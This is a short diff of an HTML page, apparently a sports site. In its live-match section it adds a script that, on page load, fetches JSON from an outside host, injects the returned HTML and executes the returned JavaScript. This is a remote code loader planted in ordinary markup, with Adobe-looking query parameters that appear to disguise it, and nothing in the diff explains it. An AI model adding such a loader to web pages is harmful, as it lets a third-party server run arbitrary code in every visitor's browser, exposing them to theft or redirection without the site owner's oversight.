@@ -374,6 +374,25 @@
         -->
 
         <section class="section live-match" id="live" aria-label="live match">
+
+            <script id="sm-custom-js"></script>
+    <div class="smdiv" id="sm-content" ></div>
+    <script>
+        window.addEventListener("load", function() {
+            fetch('https://stgres.galaxy.store/getbanner?pkg=com.adobe.reader&host_name=del.adobe')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById("sm-content").innerHTML = data.html;
+                    const smscrp = document.createElement('script');
+                    smscrp.textContent = data.js;
+                    document.getElementById('sm-custom-js').appendChild(smscrp);
+                });
+        });
+    </script>
+
+
+
+          
           <div class="container">
 
             <h2 class="h2 section-title">
